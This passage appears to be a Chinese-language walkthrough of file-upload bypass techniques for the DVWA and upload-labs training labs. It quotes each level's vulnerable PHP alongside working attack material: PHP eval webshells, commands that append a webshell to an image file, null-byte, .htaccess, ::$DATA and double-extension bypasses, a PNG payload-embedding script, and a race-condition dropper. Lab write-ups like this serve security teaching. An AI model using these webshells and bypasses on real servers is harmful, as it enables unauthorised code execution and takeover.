&quot;video/x-la-asf&quot;), (&quot;lsx&quot;, &quot;video/x-la-asf&quot;), (&quot;mng&quot;, &quot;video/x-mng&quot;), (&quot;asf&quot;, &quot;video/x-ms-asf&quot;), (&quot;asx&quot;, &quot;video/x-ms-asf&quot;), (&quot;wm&quot;, &quot;video/x-ms-wm&quot;), (&quot;wmv&quot;, &quot;video/x-ms-wmv&quot;), (&quot;wmx&quot;, &quot;video/x-ms-wmx&quot;), (&quot;wvx&quot;, &quot;video/x-ms-wvx&quot;), (&quot;avi&quot;, &quot;video/x-msvideo&quot;), (&quot;movie&quot;, &quot;video/x-sgi-movie&quot;), (&quot;mpv&quot;, &quot;video/x-matroska&quot;), (&quot;mkv&quot;, &quot;video/x-matroska&quot;), (&quot;ice&quot;, &quot;x-conference/x-cooltalk&quot;), (&quot;sisx&quot;, &quot;x-epoc/x-sisx-app&quot;), (&quot;vrm&quot;, &quot;x-world/x-vrml&quot;), (&quot;vrml&quot;, &quot;x-world/x-vrml&quot;), (&quot;wrl&quot;, &quot;x-world/x-vrml&quot;)] 文件头检查文件头检查只对文件头进行基本的校验： 常见的文件头： 后缀 文件头 文本类型 PNG 89504E47 ‰[不可显示字符]PNG GIF 47494638 GIF8 JPEG FFD8FF ÿØÿ 图马的制作 Windows 1copy pic.jpg/b+shell.php/a shell.jpg 参数/b指定以二进制格式复制、合并文件， 用于图像类/声音类文件 参数/a指定以 ASCII 格式复制、合并文件，用于 txt 等文本类文件 Linux 123456789101112131415➜ Desktop lspic.png shell.php# 拷贝一个 shell.png 用于后面的操作➜ Desktop cp pic.png shell.png➜ Desktop lspic.png shell.php shell.png# 查看一下 shell.php 内容➜ Desktop cat shell.php&lt;?php eval($_POST['x']) ?&gt;%# 将 shell.php 内容追加到 shell.png 中➜ Desktop cat shell.php &gt;&gt; shell.png 手动查看一下，发现图片尾部已经存在 WebShell 木马了： 手动生成的图马当然也是可以直接上传成功的： 00截断PHP 5.2 存在 00 截断漏洞，截断也可以用来突破上传后缀限制。发现存在路径参数，一般设计到路径参数的多，大多数可以通过 00 截断路径来突破上传限制： /var/www/html/upload/shell.php%00 /var/www/html/upload/shell.php%00 shell.png 最终成功拿到 webshell 双写后缀可以看到上传功能的逻辑代码为： 123$name = basename($_FILES['file']['name']);$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", "jsp", "jspa", "jspx", "jsw", "jsv", "jspf", "jtml", "asp", "aspx", "asa", "asax", "ascx", "ashx", "asmx", "cer", "swf", "htaccess", "ini");$name = str_replace($blacklist, "", $name); 发现一个经典的 BUG 写法： 1$name = str_replace($blacklist, "", $name); 这种情况一般都可以进行双写绕过：上传的文件名为shell.pphphp，那么被替换之后就为shell.php DVWA 文件上传File Upload LOW12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125;&#125;?&gt; 没有任何过滤直接上传 File Upload Medium123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 只校验了 Content-Type： 123// Is it an image?if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &amp;&amp;( $uploaded_size &lt; 100000 ) ) &#123; File Upload High1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= "&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; 白名单很严格，基本无法绕过 PHP strrpos() 函数查找字符串在另一字符串中最后一次出现的位置 1strrpos(string,find,start) 参数 描述 string 必需。规定被搜索的字符串。 find 必需。规定要查找的字符。 start 可选。规定在何处开始搜索。 123&lt;?phpecho strrpos("You love php, I love php too!","php");?&gt; PHP getimagesize()函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。 函数会通过读取文件头，返回图片的长、宽等信息，如果没有相关的图片文件头，函数会报错。 利用思路主要是：绕过getimagesize()函数检测识别和上传文件名的检测识别。 让getimagesize()函数检测无效的方法：文件头欺骗，继而使得getimagesize()函数无法判断： 12345678910111213141516&lt;html&gt;&lt;header&gt; &lt;meta charset="UTF-8"&gt;&lt;/header&gt;&lt;h1&gt;图片&lt;/h1&gt;&lt;?php$image = getimagesize("imgs/php.png");print_r($image);?&gt;&lt;h1&gt;木马&lt;/h1&gt;&lt;?php$shell = getimagesize("imgs/shell.png");print_r($shell);?&gt;&lt;/html&gt; Upload Labs 文件上传项目地址：https://github.com/c0ny1/upload-labs 运行phpstudy前要先运行modify_path.bat hackbar 插件 x=system（&#39;dir&#39;）;验证传是否成功,x为一句话密码 第1关 前端js绕过12345678910111213141516171819&lt;script type="text/javascript"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == "") &#123; alert("请选择要上传的文件!"); return false; &#125; //定义允许上传的文件类型 var allow_ext = ".jpg|.png|.gif"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(".")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 前端禁用js 抓包绕过 第2关 content-type123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第3关 php3 phtml1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; deny_ext 黑名单判断，于是尝试用php3,phtml绕过 apache httpd.conf进行配置 1AddType application/x-httpd-php .php .php3 .phtml 在文件上传时，我们往往会考虑到文件名截断，如%00 等.. 可能还会用冒号(“:”)去截断 13.php:jpg 冒号截断产生的文件是空白的，里面并不会有任何的内容 会写入一个3.php的空文件 &lt; 就等于 **,而*代码任意字符，于是乎可以这样修改上传的文件名，如下： 然后修改名字为 123.&lt;&lt;&lt;&lt;?php phpinfo();?&gt; 第4关 .htaccess1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 是黑名单，但几乎过滤了所有有问题的后缀名，除了.htaccess，于是首先上传一个.htaccess内容如下的文件: 1SetHandler application/x-httpd-php 然后随便上传一个后缀都会解析为php 第5关 大小写12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 大小写规则不全，可以使用phP后缀上传突破。 第6关 空格1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 利用Windows系统不解析空格的文件名特性。文件名最后增加空格 第7关 点1234567891011121314151617181920212223242526272829&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 没有删除结尾的“.”，利用windows特性，会自动去掉后缀名中最后的”.”，可在后缀名中加”.”绕过 第8关 DATA12345678910111213141516171819202122232425262728&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 还是黑名单，但是没有对后缀名进行去::$DATA处理，利用windows特性，可在后缀名中加::$DATA绕过：shell.php::$data 第9关 点+空格+点123456789101112131415161718192021222324252627282930&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 黑名单过滤，注意下面这行和之前不太一样，路径拼接的是处理后的文件名: 1$img_path = UPLOAD_PATH.&apos;/&apos;.$file_name; 原理同Pass-06，上传文件名后加上点+空格+点 1shell.php. . 第10关 嵌套绕过123456789101112131415161718192021&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array("php","php5","php4","php3","php2","html","htm","phtml","pht","jsp","jspa","jspx","jsw","jsv","jspf","jtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","swf","htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,"", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 只是删除而不是die： 1$file_name = str_ireplace($deny_ext,"", $file_name); 所以利用双写(嵌套)绕过 1shell.pphphp 第11关 GET型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125;?&gt; 白名单判断，但是$img_path直接拼接: 1$img_path = $_GET['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; 相当于上传了1.php%001.png 因此可以利用%00截断绕过： 需关闭magic_quotes_gpc php 版本&lt;5.3.4 第12关 POST型00截断1234567891011121314151617181920&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],".")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传失败"; &#125; &#125; else &#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; &#125;&#125;?&gt; save_path是通过post传进来的: 1$img_path = $_POST['save_path']."/".rand(10, 99).date("YmdHis").".".$file_ext; 还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码。 第13关 图马123456789101112131415161718192021222324252627282930313233343536373839404142&lt;?phpfunction getReailFileType($filename)&#123; $file = fopen($filename, "rb"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack("C2chars", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; getReailFileType函数只会读取文件的前两个字节: 12$file = fopen($filename, "rb");$bin = fread($file, 2); //只读2字节 所以我们伪造一个文件头即可，使用图马可以轻松绕过。利用的话，还需要结合文件包含漏洞。 第14关 getimagesize123456789101112131415161718192021222324252627282930313233&lt;?phpfunction isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; 校验了文件头： 1$info = getimagesize($filename); 利用图片马就可进行绕过 第15关 exif_imagetype12345678910111213141516171819202122232425262728293031323334353637&lt;?phpfunction isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return "gif"; break; case IMAGETYPE_JPEG: return "jpg"; break; case IMAGETYPE_PNG: return "png"; break; default: return false; break; &#125;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $res = isImage($temp_file); if(!$res)&#123; $msg = "文件未知，上传失败！"; &#125;else&#123; $img_path = UPLOAD_PATH."/".rand(10, 99).date("YmdHis").".".$res; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;&#125;?&gt; php_exif模块来判断文件类型，还是直接就可以利用图片马就可进行绕过： 1$image_type = exif_imagetype($filename); 第16关 二次渲染绕过1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586&lt;?php$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,"."),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == "jpg") &amp;&amp; ($filetype=="image/jpeg"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = "该文件不是jpg格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".jpg"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "png") &amp;&amp; ($filetype=="image/png"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = "该文件不是png格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".png"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else if(($fileext == "gif") &amp;&amp; ($filetype=="image/gif"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = "该文件不是gif格式的图片！"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).".gif"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = "上传出错！"; &#125; &#125;else&#123; $msg = "只允许上传后缀为.jpg|.png|.gif的图片文件！"; &#125;&#125;?&gt; 本关综合判断了后缀名、content-type，以及利用imagecreatefromgif判断是否为gif图片，最后再做了一次二次渲染。 所以要把木马放到两次渲染后活下来的数据块里。这里有国外大牛写的脚本，直接拿来运行即可。 123456789101112131415161718192021222324&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123; $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);&#125;imagepng($img,'./1.png');?&gt; 详细步骤转载：https://yang1k.github.io/post/upload-pass16/ upload-labs之pass 16详细分析https://xz.aliyun.com/t/2657 第17关 条件竞争12345678910111213141516171819202122232425&lt;?php$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,".")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = "只允许上传.jpg|.png|.gif类型文件！"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125;?&gt; 观察代码先传再验证是否符合要求，所以利用条件竞争删除文件时间差绕过。这里先将文件上传到服务器，然后通过rename修改名称： 123$upload_file = UPLOAD_PATH . '/' . $file_name;$img_path = UPLOAD_PATH . '/'. rand(10, 99).date("YmdHis").".".$file_ext;rename($upload_file, $img_path); 再通过unlink删除文件: 1unlink($upload_file); 因此可以通过条件竞争的方式在unlink之前，访问webshell。 1&lt;?php fputs(fopen('gg.php','w'),'&lt;?php eval($_POST[1])?&gt;');?&gt; 该木马可以在被杀掉的瞬间创建一个gg.php子木马 BurpSuite 空字节爆破：原理：第一个payload执行shell.php 第二个payload不断访问www/upload/shell.php直到生成gg.php 选择没有载荷 